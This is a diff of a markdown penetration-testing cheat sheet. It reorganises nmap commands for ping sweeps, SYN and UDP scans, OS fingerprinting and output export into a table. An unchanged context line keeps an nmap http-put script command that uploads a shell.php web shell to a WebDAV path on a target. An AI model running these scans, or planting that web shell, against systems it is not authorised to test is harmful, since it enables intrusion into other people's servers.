@@ -12,17 +12,20 @@ iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset
 
 This can make it extremely difficult (if not impossible) to get an accurate reading of the target(s).
 
-nmap scan with `nmap -sU --top-ports 20 <target>` to make it faster for UDP scans.&#x20;
-
-nmap ping sweep : `nmap -sn 192.168.0.1-254`
+|                                        |                                    |
+| -------------------------------------- | ---------------------------------- |
+| ping sweep                             | `nmap -sn 192.168.0.1-254`         |
+| SYN scan                               | `sudo nmap -sS 192.168.0.1-254`    |
+| UDP scan                               | `nmap -sU --top-ports 20 <target>` |
+| OS fingerprinting                      | sudo nmap -O 10.11.1.220           |
+| dont ping host, avoid windows firewall | -Pn                                |
+| export all                             | nmap -oA all 192.168.0.1           |
 
 ```
 nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'
 ```
 
 https://nmap.org/nsedoc/
-
-`-Pn` : don't ping host, avoid windows firewall, treat the host as being alive always use `-vv`, better to have more verbosity
 
 #### Enumerate samba shares
 
